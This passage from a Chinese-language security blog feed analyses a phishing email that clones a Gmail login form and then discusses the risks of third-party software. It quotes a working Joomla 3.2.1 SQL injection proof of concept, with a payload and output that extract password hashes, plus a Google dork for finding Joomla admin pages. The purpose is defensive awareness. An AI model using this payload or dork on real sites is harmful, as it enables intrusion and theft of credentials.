class=&quot;s&quot;&gt;&amp;quot;gaia_loginform&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;GALX&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;6UMbQQmFgwI&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;continue&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://mail.google.com/mail/&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;service&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;mail&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hl&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;en&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;scc&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;sacu&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;_utf8&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;_utf8&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;☃&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;bgresponse&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;bgresponse&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;js_disabled&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;pstMsg&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;pstMsg&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;dnConn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;dnConn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkConnection&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkConnection&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;youtube:424:1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkedDomains&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkedDomains&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;youtube&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden-label&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Email&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;spellcheck=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;false&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;email&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden-label&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Passwd&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Passwd&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Passwd&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Password&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;signIn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;signIn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;rc-button rc-button-submit&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Sign in&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;發現了嗎？其中 form 的 action 欄位被取代成「&lt;strong&gt;http://cantonfair.a78.org/yahoo/post.php&lt;/strong&gt;」，而這個頁面會直接接收受害者輸入的帳號密碼，並且自動跳轉到真正的 Google 登入頁面。攻擊者從 a78.org 這個網站中直接取得所有被駭的人輸入的帳號密碼。&lt;/p&gt;

&lt;p&gt;這是一個很簡單、典型、又易被發現的釣魚案例。如果一時不察不小心輸入了帳號密碼，下次帳號被盜的就是自己。建議大家在收取信件的時候遵循幾大原則：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;不隨便開啟附加檔案：附件常夾帶惡意程式、執行檔、惡意文件、釣魚網頁等，切勿隨便開啟。可使用 Google Docs 開啟附件文件防止惡意文件攻擊 Adobe PDF Reader、Microsoft Office 等程式。更常有把惡意程式加密壓縮後寄出，在信中附上密碼，借此規避防毒軟體的偵測，不可不慎。&lt;/li&gt;
  &lt;li&gt;注意信件中的超連結 URL：釣魚信件常在超連結中使用惡意網站的 URL，在點選之前務必仔細檢查，更要小心「Goog&lt;strong&gt;l&lt;/strong&gt;e」及「Goog&lt;strong&gt;1&lt;/strong&gt;e」之類的英文數字差異。&lt;/li&gt;
  &lt;li&gt;注意信件中的語氣：有的時候攻擊者仿冒你身邊可信任的人寄信給你，但是語氣、用詞要非常精準。如果出現了「&lt;strong&gt;尊敬的用戶您好&lt;/strong&gt;」你就會發現這個應該不太像是台灣本土的信件用語。&lt;/li&gt;
  &lt;li&gt;不在信件中夾帶機敏資料：信件是不安全的，切勿在信中提到帳號、密碼、個資等機密資料。&lt;/li&gt;
  &lt;li&gt;不回應陌生郵件：郵件中會夾帶自己的 IP 位址，回應信件可能讓攻擊者得到這些資料。&lt;/li&gt;
  &lt;li&gt;使用安全的郵件軟體：若使用安全的郵件軟體、平台，例如 Gmail，遇到惡意郵件時，會即時阻擋並且警告用戶。如果使用自己的郵件軟體，就要特別注意釣魚等攻擊。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;電子郵件的攻擊已經成為滲透攻擊主要的手法之一，不少國際資安事件都是肇因於惡意郵件。例如 2013 年韓國 DarkSeoul 事件，以及竄改交易匯款資料郵件詐取匯款等。身為目標的我們更要時時注意使用電子郵件時的安全事項。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>使用第三方套件所要擔負的資安風險</title>
   <link href="http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/"/>
   <updated>2014-03-14T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/03/14/3rd-party-software-security-issues</id>
   <content type="html">
&lt;p&gt;使用第三方套件節省開發時間，已經是整個資訊產業的慣例。但是很多管理者可能不知道，使用第三方套件到底需要擔負多大的資安風險。你確定你用的套件是安全無虞的嗎？是否有經過嚴謹的安全測試？若有安全漏洞引爆，是否有廠商可以負責維護修補？廠商開發的程式碼品質是否穩定？這些都是在使用之前必須要考慮的。&lt;/p&gt;

&lt;p&gt;在服務眾多客戶之後，我們深知這些問題的嚴重性。以下我們將就幾個經典的案例來說明使用第三方套件所要擔負的風險，並且分享我們對於第三方套件的安全建議。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;section&quot;&gt;程式碼的安全性？&lt;/h3&gt;

&lt;p&gt;程式碼的品質直接決定了系統的安全性。如果一個套件有以下幾點因素：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;程式開發已久難以修改&lt;/li&gt;
  &lt;li&gt;開發人員無安全觀念&lt;/li&gt;
  &lt;li&gt;大量整合外部套件，無法控管每個套件安全&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;可能就因為程式碼難以修改，形成漏洞百出的程式架構。若是之後陸續發生安全問題，儘管不斷的修補漏洞，但卻會因為程式碼的設計、架構等因素，造成日後依舊陸續有安全疑慮。&lt;/p&gt;

&lt;h3 id=&quot;dedecms&quot;&gt;案例說明：DedeCMS&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.dedecms.com/&quot;&gt;DedeCMS&lt;/a&gt; 是知名的內容管理系統，不少公司拿此套件架設網站、部落格等。但在這幾個月，在「&lt;a href=&quot;http://wooyun.org&quot;&gt;烏雲平台&lt;/a&gt;」上陸續有人揭露 DedeCMS 的漏洞。包括大量各種 SQL Injection、Cross-Site Scripting 弱點等等，甚至還包括 Command Execution 問題。如果沒有即時修正這些問題，小則造成用戶帳號被盜，大則造成整台主機被入侵，取得作業系統權限。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-oPACG8e-4t0/Ux3lMIP6NVI/AAAAAAAAAKc/V9RKKU7mz1A/w960-h678-no/blog_3rd_party_security_00.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-oPACG8e-4t0/Ux3lMIP6NVI/AAAAAAAAAKc/V9RKKU7mz1A/w600/blog_3rd_party_security_00.png&quot; alt=&quot;烏雲漏洞報告平台&quot; title=&quot;烏雲漏洞報告平台&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;什麼系統沒被找到漏洞過呢？有那麼嚴重嗎？但該系統已經不只一次出現重大漏洞導致企業遭到入侵，在今年一二月份更是遭揭露多達十數個高風險 SQL Injection 資料庫注入漏洞。此現象凸顯該套件的設計並未經過安全測試，並且採用不安全的程式撰寫方式，未來可能會有更多隱含的漏洞釋出。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-JIR-uh9OveA/Ux3lMKjdogI/AAAAAAAAAKY/ZmWDD7Yg-js/w1218-h860-no/blog_3rd_party_security_02.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-JIR-uh9OveA/Ux3lMKjdogI/AAAAAAAAAKY/ZmWDD7Yg-js/w600/blog_3rd_party_security_02.png&quot; alt=&quot;dedecms漏洞於烏雲平台&quot; title=&quot;dedecms漏洞於烏雲平台&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在平台中搜尋關鍵字「DedeCMS」，會發現漏洞提報的次數相當多，在漏洞的評論中也有不少技術人員進行討論。但更多的疑惑是為什麼 DedeCMS 會一再的發生資安問題。例如以下漏洞：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-052010&quot;&gt;Dedecms某命令執行漏洞&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051950&quot;&gt;DedeCMS全版本通殺SQL注入(真正的無任何限制附官方測試結果)&lt;/a&gt;  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://wooyun.org/bugs/wooyun-2014-051889&quot;&gt;DedeCMS全版本通殺SQL注入(無任何限制)&lt;/a&gt; &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-052792&quot;&gt;Dedecms某命令执行漏洞（续）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-TD5ZDIQe4K4/Ux3lMyME3vI/AAAAAAAAAKg/BlLdMesp0MI/w1218-h860-no/blog_3rd_party_security_03.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-TD5ZDIQe4K4/Ux3lMyME3vI/AAAAAAAAAKg/BlLdMesp0MI/w600/blog_3rd_party_security_03.png&quot; alt=&quot;dedecms漏洞於烏雲平台&quot; title=&quot;dedecms漏洞於烏雲平台&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;而於另一個「&lt;a href=&quot;http://sebug.net&quot;&gt;Sebug 安全漏洞信息庫&lt;/a&gt;」也可以看到不少 DedeCMS 的蹤影。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-5YS9t-YHgKk/Ux3lMMmjbqI/AAAAAAAAAKU/FWFu1liQdks/w1218-h860-no/blog_3rd_party_security_01.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-5YS9t-YHgKk/Ux3lMMmjbqI/AAAAAAAAAKU/FWFu1liQdks/w600/blog_3rd_party_security_01.png&quot; alt=&quot;sebug安全漏洞信息庫&quot; title=&quot;sebug安全漏洞信息庫&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果官方在第一時間就能接獲通報、了解問題並修正解決，提供更新程式給客戶更新，那安全的風險會小些。但在官方尚未釋出更新的這段時間，網站將完全的暴露在風險當中。有心人士看到套件的漏洞陸續被揭露，也會更有興趣尋找使用該套件的網站攻擊。&lt;/p&gt;

&lt;h3 id=&quot;joomla&quot;&gt;案例說明：Joomla!&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.joomla.org&quot;&gt;Joomla!&lt;/a&gt; 是另一套國際非常知名的 CMS 系統，因為其便利性，很多企業、學校、政府單位，都採用此套件建立網站。透過 Google Hacking 方式可以找到台灣非常多網站都使用 Joomla! 架站。&lt;/p&gt;

&lt;pre&gt;
site:tw intitle:管理區 inurl:administrator
&lt;/pre&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-_PP2U3n_zW8/Ux77uXKLAnI/AAAAAAAAAME/_e8VIuM_ATQ/w1218-h860-no/blog_3rd_party_security_04.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-_PP2U3n_zW8/Ux77uXKLAnI/AAAAAAAAAME/_e8VIuM_ATQ/w600/blog_3rd_party_security_04.png&quot; alt=&quot;Google Hacking 尋找 Joomla!&quot; title=&quot;Google Hacking 尋找 Joomla!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;但是如果今天這個系統出了問題呢？「Joomla!」因為外掛、套件眾多，也經常成為漏洞發掘的對象。在 2014/02/05，國外釋出了一個 SQL Injection Exploit，可以導致網站帳號密碼直接被導出。&lt;/p&gt;

&lt;p&gt;官方安全公告：&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Secunia: Joomla! Multiple Vulnerabilities &lt;a href=&quot;http://secunia.com/advisories/56772/&quot;&gt;http://secunia.com/advisories/56772/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploit 位址：&lt;a href=&quot;http://www.exploit-db.com/exploits/31459/&quot;&gt;http://www.exploit-db.com/exploits/31459/&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;# Exploit Title: Joomla 3.2.1 sql injection
# Date: 05/02/2014
# Exploit Author: kiall-9@mail.com
# Vendor Homepage: http://www.joomla.org/
# Software Link: http://joomlacode.org/gf/download/frsrelease/19007/134333/Joomla_3.2.1-Stable-Full_Package.zip
# Version: 3.2.1 (default installation with Test sample data)
# Tested on: Virtualbox (debian) + apache
POC=&amp;gt;
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=\
 
will cause an error:
 
1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;\)&amp;#39; at line 3 SQL=SELECT `t`.`id` FROM `k59cv_tags` AS t INNER JOIN `k59cv_contentitem_tag_map` AS m ON `m`.`tag_id` = `t`.`id` AND `m`.`type_alias` = &amp;#39;com_weblinks.categories&amp;#39; AND `m`.`content_item_id` IN ( \) Array ( [type] =&amp;gt; 8 [message] =&amp;gt; Undefined offset: 0 [file] =&amp;gt; /var/www/Joomla_3.2.1/libraries/joomla/filter/input.php [line] =&amp;gt; 203 )
 
I modified the original error.php file with this code --- &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php print_r(error_get_last()); ?&amp;gt;&lt;/span&gt; --- in order to obtain something useful. ;-)
 
Now i can easily exploit this flaw:
 
http://localhost/Joomla_3.2.1/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60k59cv_users%60%20--%20%29
and obtain the hash:
 
1054 Unknown column &amp;#39;$P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1&amp;#39; in &amp;#39;where clause&amp;#39; SQL=SELECT `m`.`tag_id`,`m`.`core_content_id`,`m`.`content_item_id`,`m`.`type_alias`,COUNT( `tag_id`) AS `count`,`t`.`access`,`t`.`id`,`ct`.`router`,`cc`.`core_title`,`cc`.`core_alias`,`cc`.`core_catid`,`cc`.`core_language` FROM `k59cv_contentitem_tag_map` AS `m` INNER JOIN `k59cv_tags` AS `t` ON m.tag_id = t.id INNER JOIN `k59cv_ucm_content` AS `cc` ON m.core_content_id = cc.core_content_id INNER JOIN `k59cv_content_types` AS `ct` ON m.type_alias = ct.type_alias WHERE `m`.`tag_id` IN ($P$D8wDjZpDIF4cEn41o0b4XW5CUrkCOZ1) AND t.access IN (1,1) AND (`m`.`content_item_id` &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&amp;gt; 0 ) union select password from `k59cv_users` -- ) OR `m`.`type_alias` &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&amp;gt; &amp;#39;com_weblinks.categories&amp;#39;) AND `cc`.`core_state` = 1 GROUP BY `m`.`core_content_id` ORDER BY `count` DESC LIMIT 0, 5
 
CheerZ&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;值得注意一看的是&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;官方公告&lt;/a&gt;，上面標註著漏洞回報時間以及修補時間。2014/2/6 接獲回報，2014/3/6 修復。在這整整一個月的時間之內，所有適用版本內的 Joomla! 網站都將受此漏洞影響。因此套件廠商的反應修復速度越慢，顧客暴露在風險之中的時間越長。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Project: Joomla!
SubProject: CMS
Severity: High
Versions: 3.1.0 through 3.2.2
Exploit type: SQL Injection
Reported Date: 2014-February-06
Fixed Date: 2014-March-06
CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;section-1&quot;&gt;案例說明：外包廠商&lt;/h3&gt;

&lt;iframe src=&quot;//embed.gettyimages.com/embed/147456329?et=tHsuT-4nxk-4NvmLZycwCA&amp;amp;sig=Z5X7iFr5V9vS70tCT49wQA8EldpRXSuV3jpoBtgTmg4=&quot; width=&quot;507&quot; height=&quot;406&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&gt; &lt;/iframe&gt;

&lt;p&gt;這樣的情境你是否熟悉？&lt;/p&gt;

&lt;p&gt;公司有一套客製化的系統需要建置，但是因為公司內部開發人員不足，因此把這個系統外包出去給廠商做。貨比三家不吃虧，比了 A B C 三家，發現 A 家最便宜實惠，交貨時間又短。決定就把這個系統發包給 A 廠商做。半年過去了，這個廠商順利交貨結案。&lt;/p&gt;

&lt;p&gt;一年過後，發現這個系統竟然遭到入侵，主動攻擊內部其他伺服器。「不是有買防火牆嗎？怎麼還會被入侵？」老闆說。這可嚴重了，馬上找廠商來刮一頓。沒想到，A 廠商表示，該案已經順利結案，維護期也已經過了，沒辦法提供協助，除非繼續簽訂維護合約。問題總得解決，簽訂了維護合約之後，A 廠商也協助把病毒砍掉了。圓滿結束？事情有那麼簡單嗎？&lt;/p&gt;

&lt;p&gt;過了兩天，系統又開始攻擊其他伺服器。「病毒不是已經砍掉了嗎？」老闆說。問題在哪大家應該都很清楚。在尋找資安廠商協助之下，發現主機是因為 A 廠商設計的系統含有漏洞，導致 SQL Injection 問題，遭攻擊者利用植入惡意程式。A 廠商百般無奈，摸摸鼻子把這個漏洞修補起來。又過了兩天，再度遭到入侵。看了看，發現又是另一個 SQL Injection 問題。在幾次與攻擊者的不斷角力之下，終於好像把問題都修完了。&lt;/p&gt;

&lt;p&gt;過了一週，系統再度有惡意程式的蹤跡，A 廠商也無能為力。資安廠商表示，買這個就對了！在陸續被迫買了防火牆、WAF、IDS 等設備後，雖然問題貌似改善，但系統仍然零星有入侵事件發生。公司只好「斷然處置」，等待下次預算，另請廠商重新開發系統。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 1：該系統是否還有其他漏洞？&lt;/li&gt;
  &lt;li&gt;問題 2：公司的處置是否正確？&lt;/li&gt;
  &lt;li&gt;問題 3：A 廠商的其他客戶是否有類似的問題？&lt;/li&gt;
  &lt;li&gt;問題 4：不是有買資安設備？為什麼還會有資安事件？&lt;/li&gt;
  &lt;li&gt;問題 5：公司該如何自保？&lt;/li&gt;
  &lt;li&gt;問題 6：廠商該如何自保？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;想一下以上各點問題。&lt;/p&gt;

&lt;ul&gt;
